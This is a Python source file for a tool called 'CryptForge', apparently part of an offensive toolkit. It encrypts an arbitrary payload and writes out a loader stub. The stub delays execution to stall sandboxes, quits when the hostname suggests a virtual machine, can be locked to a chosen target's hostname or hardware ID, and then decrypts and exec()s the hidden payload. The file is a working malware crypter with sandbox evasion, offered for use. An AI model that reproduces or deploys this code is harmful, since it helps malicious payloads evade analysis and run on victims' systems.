import os
import hashlib
import random
import string
import base64
import time
import questionary
from cryptography.fernet import Fernet
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE

console = Console()


class CryptForge:
    def __init__(self):
        self.output_file = "locked_payload.py"

    def generate_stub(self, key_base, encrypted_data, lock_val, lock_type):
        """
        Generates a hardened stub with anti-debugging and environmental checks.
        """
        stub = f"""
import os
import sys
import base64
import hashlib
import socket
import time
import subprocess
from cryptography.fernet import Fernet

def get_hwid():
    # Cross-platform Hardware ID discovery
    if sys.platform == "win32":
        return subprocess.check_output('wmic csproduct get uuid').decode().split('\\n')[1].strip()
    else:
        # Linux/macOS fallback to Machine ID
        for path in ['/etc/machine-id', '/var/lib/dbus/machine-id']:
            if os.path.exists(path):
                with open(path, 'r') as f: return f.read().strip()
    return socket.gethostname()

def execute():
    # --- Sandbox Evasion / Anti-Analysis ---
    # 1. Execution Delay (Stalls automated sandboxes)
    time.sleep({random.randint(2, 5)})
    
    # 2. Check for common sandbox/VM artifacts
    vm_artifacts = ['sandbox', 'virtual', 'vmware', 'vbox']
    if any(art in socket.gethostname().lower() for art in vm_artifacts):
        return

    k = b'{key_base.decode()}'
    lock_target = "{lock_val}"
    lock_type = "{lock_type}"
    
    # --- Environmental Lock Verification ---
    current_val = ""
    if lock_type == "hostname":
        current_val = socket.gethostname()
    elif lock_type == "hwid":
        current_val = get_hwid()

    if lock_target and current_val != lock_target:
        # Silent exit if the environment doesn't match
        return 
    
    try:
        # Mutate key based on environment if locked
        if lock_target:
            k = base64.urlsafe_b64encode(hashlib.sha256(k + lock_target.encode()).digest())
        
        cipher = Fernet(k)
        decrypted = cipher.decrypt(b'{encrypted_data.decode()}')
        exec(decrypted)
    except Exception:
        sys.exit()

if __name__ == "__main__":
    execute()
"""
        return stub

    def run(self, file_path):
        """Encrypts a payload with multi-factor environmental locking."""
        if not os.path.exists(file_path):
            return console.print(f"[red][!] Error: Source file {file_path} not found.[/red]")

        choice = questionary.select(
            "Select Encryption Mode:",
            choices=[
                "1. No Lock (Global Execution)",
                "2. Hostname Lock (Target Specific)",
                "3. Hardware ID (HWID) Lock (Device Specific)"
            ],
            style=Q_STYLE
        ).ask()

        lock_val = ""
        lock_type = "none"

        if "Hostname" in choice:
            lock_val = questionary.text(
                "Enter Target Hostname:", style=Q_STYLE).ask()
            lock_type = "hostname"
        elif "Hardware" in choice:
            lock_val = questionary.text(
                "Enter Target HWID:", style=Q_STYLE).ask()
            lock_type = "hwid"

        # Generate the cryptographic key
        key_base = Fernet.generate_key()

        # If locked, the key itself is never stored in its final form.
        # It must be derived using the target's environment.
        derivation_key = key_base
        if lock_val:
            derivation_key = base64.urlsafe_b64encode(
                hashlib.sha256(key_base + lock_val.encode()).digest())

        try:
            cipher = Fernet(derivation_key)
            with open(file_path, "rb") as f:
                raw_data = f.read()

            encrypted_data = cipher.encrypt(raw_data)

            # Generate the Python stub
            final_stub = self.generate_stub(
                key_base, encrypted_data, lock_val, lock_type)

            with open(self.output_file, "w") as f:
                f.write(final_stub)

            console.print(Panel(
                f"[bold green][+] Environmental Locked Payload: {self.output_file}[/bold green]\n"
                f"[white]Lock Type:[/white] {lock_type}\n"
                f"[white]Target:[/white] {lock_val if lock_val else 'None (Global)'}",
                title="CryptForge Success", border_style="green"
            ))

        except Exception as e:
            console.print(f"[red][!] Encryption failed: {e}[/red]")

        questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def encrypt_payload(file_path):
    forge = CryptForge()
    forge.run(file_path)


if __name__ == "__main__":
    target = questionary.text("Payload file to encrypt:", style=Q_STYLE).ask()
    if target:
        encrypt_payload(target)
